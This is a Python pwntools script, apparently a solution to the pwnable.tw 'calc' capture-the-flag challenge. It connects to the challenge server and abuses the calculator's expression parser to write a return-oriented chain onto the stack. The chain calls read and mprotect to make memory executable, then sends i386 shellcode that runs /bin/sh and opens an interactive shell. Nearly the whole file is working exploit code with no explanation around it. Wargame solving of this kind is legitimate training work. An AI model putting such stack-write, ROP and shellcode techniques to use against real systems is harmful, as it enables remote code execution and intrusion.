#!/usr/bin/env	python3
import pwn

pwn.context.arch = "i386"

#@pwn.context.quiet
def main():
	#proc_p = pwn.process("./calc")
	proc_p = pwn.remote("chall.pwnable.tw", 10100)
	proc_p.clean()

# stage 1 shellcode
	# exploit
	# calling read function
	proc_p.sendline(b"00+00+369%1000")
	proc_p.sendline(b"00+00+368%134512640")
	proc_p.sendline(b"00+00+367%1")
	proc_p.sendline(b"00+00+366%134512640")
	proc_p.sendline(b"00+00+365%134670084")

	# calling mprotect to make binary executable
	# then calling read to read stage 2 shellcode
	proc_p.sendline(b"00+00+364%7")
	proc_p.sendline(b"00+00+363%4096")
	proc_p.sendline(b"00+00+362%134512640")
	proc_p.sendline(b"00+00+361%135000523")
	proc_p.sendline(b"00+00+360%134672880")

	#proc_p.send(b"\n")

	proc_p.send(b"\n")
	proc_p.clean()

# stage 2 shellcode
	shellcode = pwn.asm("""
			push 0x0068732f
			push 0x6e69622f

			mov ebx, esp
			mov eax, 11
			xor ecx, ecx
			xor edx, edx
			int 0x80
	""")

	proc_p.sendline(shellcode)
	#proc_p.stdout.write(shellcode + b"\n")
	#proc_p.stdout.flush()

	proc_p.interactive()

	proc_p.close()

if __name__ == "__main__":
	main()
